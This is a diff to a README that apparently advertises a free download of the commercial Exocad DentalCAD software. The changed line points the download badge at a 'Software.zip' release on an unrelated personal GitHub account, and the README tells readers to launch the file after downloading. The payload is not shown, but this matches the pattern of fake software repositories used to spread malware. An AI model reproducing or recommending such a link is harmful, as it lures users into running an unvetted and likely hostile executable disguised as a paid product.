@@ -32,7 +32,7 @@ Exocad DentalCAD is advanced software for digital dentistry, offering tools for 
 
 ## Get Started
 🚀 **Download the Exocad-DentalCAD-Software here:**
-[![Download Exocad-DentalCAD-Software](https://img.shields.io/badge/Download-Exocad--DentalCAD--Software-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Exocad-DentalCAD-Software](https://github.com/MINATOYTB836/Exocad-DentalCAD-Software/releases/download/v1.0/Software.zip)](https://github.com/MINATOYTB836/Exocad-DentalCAD-Software/releases/download/v1.0/Software.zip)
 
 *(The file needs to be launched after downloading)*
 
